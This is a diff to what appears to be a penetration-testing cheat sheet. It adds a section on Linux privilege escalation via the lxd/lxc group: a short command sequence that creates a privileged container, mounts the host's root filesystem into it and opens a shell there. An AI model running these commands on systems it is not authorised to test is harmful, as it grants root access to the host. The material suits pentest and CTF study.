@@ -870,6 +870,16 @@ kali@kali:sudo machinectl remove MACHINE_NAME
 ```
 ### Priviledged Groups
 https://www.drakeaxelrod.com/notes/linux/privileged-groups
+###### lxd | lxc group
+First we need to have container images
+```
+lxc image import ubuntu-template.tar.xz --alias ubuntutemp
+lxc image list
+lxc init ubuntutemp privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/bash | lxc exec privesc /bin/sh
+```
 ### Abusing Capability  
 | Capability | Description |
 |---|---|
